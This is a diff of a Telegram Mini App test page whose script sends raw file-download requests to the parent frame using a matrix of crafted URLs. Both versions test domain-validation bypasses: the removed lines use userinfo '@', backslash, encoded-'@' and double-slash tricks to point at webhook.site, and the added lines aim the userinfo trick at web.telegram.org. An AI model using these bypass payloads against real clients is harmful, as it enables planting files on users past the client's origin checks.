@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>web-app-ext matrix v5</title>
+<title>web-app-ext matrix v6</title>
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 <style>
 body { font-family: monospace; background: #fff; color: #111; padding: 6px; font-size: 11px; margin: 0; }
@@ -31,31 +31,28 @@ function log(msg, cls) {
 function rawEvent(type, data) {
   window.parent.postMessage(JSON.stringify({eventType: type, eventData: data}), '*');
 }
-log('probe5 init platform=' + tg.platform + ' v=' + tg.version + ' initData=' + (tg.initData ? 'yes' : 'NO'));
+log('probe6 init platform=' + tg.platform + ' v=' + tg.version + ' initData=' + (tg.initData ? 'yes' : 'NO'));
 tg.ready();
 tg.onEvent('file_download_requested', ev => log('EV file_download_requested: ' + JSON.stringify(ev), 'dim'));
 
 const CASES = [
-  { id: 'own-domain',   url: 'https://' + DOM + '/tgmini-zcode/m6-own.png' },
-  { id: 'userinfo',     url: 'https://' + DOM + '@webhook.site/74aa897d-5aac-4477-890c-179212c5e77b/m2-userinfo.png' },
-  { id: 'backslash',    url: 'https://webhook.site\\@' + DOM + '/m3-backslash.png' },
-  { id: 'enc-user',     url: 'https://' + DOM + '%40webhook.site/m4.png' },
-  { id: 'dbl-slash',    url: 'https://' + DOM + '//webhook.site/74aa897d-5aac-4477-890c-179212c5e77b/m5.png' },
-  { id: 'tg-origin',    url: 'https://web.telegram.org/k/m7-tgorigin.png' }
+  { id: 'own-ok',       url: 'https://' + DOM + '/tgmini-zcode/m6-own.png' },
+  { id: 'tg-userinfo',  url: 'https://' + DOM + '@web.telegram.org/k/probe_tg.html' },
+  { id: 'tg-direct',    url: 'https://web.telegram.org/k/probe_tg2.html' }
 ];
 
 let idx = 0;
 function next() {
   if (idx >= CASES.length) { log('MATRIX DONE', 'ok'); return; }
   const c = CASES[idx++];
-  log('[' + c.id + '] raw postEvent url=' + c.url, 'dim');
+  log('[' + c.id + '] raw postEvent', 'dim');
   try {
-    rawEvent('web_app_request_file_download', {url: c.url, file_name: 'probe_' + c.id + '.png'});
+    rawEvent('web_app_request_file_download', {url: c.url, file_name: 'probe_' + c.id + '.bin'});
     log('[' + c.id + '] posted');
   } catch (e) {
     log('[' + c.id + '] threw: ' + (e && e.message || e), 'bad');
   }
-  setTimeout(next, 5000);
+  setTimeout(next, 8000);
 }
 if (tg.initData) {
   log('autorun in 2s');
